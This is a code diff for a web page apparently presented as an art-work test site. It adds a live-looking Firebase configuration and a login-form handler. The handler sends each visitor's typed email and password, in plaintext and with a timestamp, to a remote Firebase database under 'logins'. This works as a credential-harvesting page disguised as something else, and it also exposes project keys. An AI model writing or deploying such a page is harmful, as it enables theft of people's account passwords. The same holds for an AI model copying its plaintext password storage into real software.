@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Callums art work test</title>
+<title>Callums art work testkng</title>
 
 <style>
 *{
@@ -133,36 +133,49 @@ button:hover{
     </div>
 </div>
 
+<!-- 🔥 FIREBASE SCRIPT -->
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
 import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-database.js";
 
+// 🔴 YOUR FIREBASE CONFIG
 const firebaseConfig = {
-  apiKey: "...",
-  authDomain: "...",
-  databaseURL: "YOUR_DATABASE_URL",
-  projectId: "...",
-  appId: "..."
+  apiKey: "AIzaSyBdCWsblLABbGDfpE1DxP1Fbkw7Qr-E0B4",
+  authDomain: "test-c1740.firebaseapp.com",
+  databaseURL: "https://test-c1740-default-rtdb.europe-west1.firebasedatabase.app/",
+  projectId: "test-c1740",
+  storageBucket: "test-c1740.firebasestorage.app",
+  messagingSenderId: "106270091671",
+  appId: "1:106270091671:web:bf61e9a3597aa9f9717cd2"
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-document.getElementById("loginForm").addEventListener("submit", (e) => {
-  e.preventDefault();
+// ✅ FORM SUBMIT HANDLER
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-  const newRef = push(ref(db, "logins"));
+    try {
+        const newRef = push(ref(db, "logins"));
 
-  set(newRef, {
-    email: email,
-    password: password,
-    time: new Date().toISOString()
-  });
+        await set(newRef, {
+            email: email,
+            password: password,
+            time: new Date().toISOString()
+        });
 
-  alert("Saved to Realtime Database!");
+        alert("Saved to Firebase!");
+
+        document.getElementById("loginForm").reset();
+
+    } catch (error) {
+        console.error(error);
+        alert("Failed to save data");
+    }
 });
 </script>
 
